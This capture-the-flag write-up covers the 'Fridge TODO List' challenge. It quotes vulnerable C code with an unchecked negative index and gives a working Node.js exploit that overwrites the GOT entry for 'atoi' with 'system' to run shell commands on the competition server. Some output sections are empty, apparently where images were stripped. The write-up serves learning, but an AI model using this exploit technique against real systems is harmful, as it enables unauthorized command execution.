<p>It's unfortunate, but these SUID binary exploits are a bit too difficult. I
managed to solve none of them. I will go study more about SUID binaries and
hopefully I can get cakes next year.</p>
<p>But hey, I did manage to hack into the smart fridge.</p>
<h2 id="fridgetodolist">Fridge TODO List</h2>
<p>The source code of the vulnerable program is included in the attachment.
Reading over it, it's not hard to see what's broken, but how to exploit it
is another question:</p>
<pre><code class="C language-C">// [...]

void store_todo() {
  printf("In which slot would you like to store the new entry? ");
  fflush(stdout);
  int idx = read_int();
  if (idx &gt; TODO_COUNT) {
    puts(OUT_OF_BOUNDS_MESSAGE);
    return;
  }
  printf("What's your TODO? ");
  fflush(stdout);
  read_line(&amp;todos[idx*TODO_LENGTH], TODO_LENGTH);
}

void print_todo() {
  printf("Which entry would you like to read? ");
  fflush(stdout);
  int idx = read_int();
  if (idx &gt; TODO_COUNT) {
    puts(OUT_OF_BOUNDS_MESSAGE);
    return;
  }
  printf("Your TODO: %s\n", &amp;todos[idx*TODO_LENGTH]);
}

// [...]
</code></pre>
<p>If I enter a negative number, I can read and write data out of bound. However,
<code>TODO_LENGTH</code> is <code>0x30</code>, so my access is somewhat restricted. With some math
and a disassembler, I found places that I can access:</p>
<pre><code>-6  The "write" function in the Global Offset Table
-5  The "strncat" function in the Global Offset Table
-4  The "open" function in the Global Offset Table
-3  Some random place
-2  Start of "username" buffer
-1  Somewhere in the middle of "username" buffer
</code></pre>
<p>The <code>system</code> function in between <code>write</code> and <code>strncat</code> would allow me to
execute any shell command, so my goal should be to overwrite the Global Offset
Table (GOT) and make some other function point to <code>system</code>. Since <code>atoi</code> is
used to parse my menu choice input, it would be easy to exploit if I can make
<code>atoi</code> point to <code>system</code>. But there is another problem, modern operating
systems have Address Space Layout Randomization (ASLR), and a static payload
would not work.</p>
<p>I spent some time creating a
<a href="https://github.com/jspenguin2017/Blog/tree/master/tools/lib">Node.js library</a>
that allow my scripts to react to different server response over <code>netcat</code>.
Since I can't directly read the address of <code>system</code>, I have to calculate it
based on something else. <code>strncat</code> is already called before I can leak the
GOT, but <code>write</code> is only called when the program is exiting, so its GOT entry
should be still pointing to the Procedure Linkage Table (PLT). With Hopper
Disassembler, I determined that the <code>system</code> entry in PLT is <code>0x30</code> below
<code>write</code>. Hopefully it'll work:</p>
<pre><code class="JavaScript language-JavaScript">"use strict";

const assert = require("assert");

const hex_utils = require("./lib/hex_utils");
const net_utils = require("./lib/net_utils");

const conn = new net_utils("fridge-todo-list.ctfcompetition.com", 1337);

(async () =&gt; {
    // Log in as (fake) root
    await conn.read_until("user:");
    conn.write_line("root");

    await conn.read_until("&gt;");
    conn.write_line("2");

    // Leak address of "write" in the GOT
    await conn.read_until("read?");
    conn.write_line("-6");

    await conn.read_until("TODO: ");
    let data = await conn.read_until("Hi root");

    const i = data.indexOf("\n\n");
    assert(i !== -1);
    data = data.slice(0, i);
    hex_utils.add_carry(data, 0x30);

    // Overwrite "atoi" with "system", corrupting "open" on the way, I don't
    // need "open" anymore, so it's OK
    await conn.read_until("&gt;");
    conn.write_line("3");

    await conn.read_until("entry?");
    conn.write_line("-4");

    await conn.read_until("TODO?");
    conn.write_bytes("A".repeat(8));
    conn.write_bytes(data);
    conn.write_bytes("\n");

    // List directory
    await conn.read_until("&gt;");
    conn.write_line("ls -al ./todos");
})();
</code></pre>
<p>Let's try it:</p>
<pre><code>$ node exploit
[...]
&gt; ls -al ./todos

<p>Looks like Wintermuted is using <code>CountZero</code> as his username:</p>

<p>And there is the flag. Check <code>/home/user/holey_beep</code>? What does that mean?</p>
<p>As for the URL in the flag, it links to a (troll) tweet saying signed integers
are more secure than unsigned ones.</p>
<h2 id="holeybeep">Holey… Beep?</h2>
<p>Holey Beep, or <a href="https://nvd.nist.gov/vuln/detail/CVE-2018-0492">CVE-2018-0492</a>,
is a privilege escalation vulnerability in the <code>beep</code> utility. Although I
managed to understand how Holey Beep works, I didn't manage to complete this
quest…</p>
<p>I will be back… Next year…</p></div>
